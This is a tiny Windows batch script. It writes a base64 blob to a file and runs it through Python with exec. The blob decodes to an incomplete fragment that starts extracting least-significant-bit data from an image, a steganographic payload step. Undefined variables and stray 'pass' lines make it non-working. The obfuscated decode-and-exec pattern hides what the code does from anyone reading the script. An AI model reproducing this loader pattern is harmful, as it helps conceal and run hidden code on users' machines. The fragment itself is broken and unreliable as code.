@echo off
echo ZnJvbSBQSUwgaW1wb3J0IEltYWdlCmltZyA9IEltYWdlLm9wZW4oaW8uQnl0ZXNJTyhpbWdfZGF0YSkpCnNpemVfYml0cy5hcHBlbmQociAmIDEpCnNpemVfYml0cy5hcHBlbmQoZyAmIDEpCnNpemVfYml0cy5hcHBlbmQoYiAmIDEpCnBhc3MKcGFzcwo=> "%SITE%"
python.exe -c "import base64; exec(base64.b64decode(open('%SITE%').read()))"
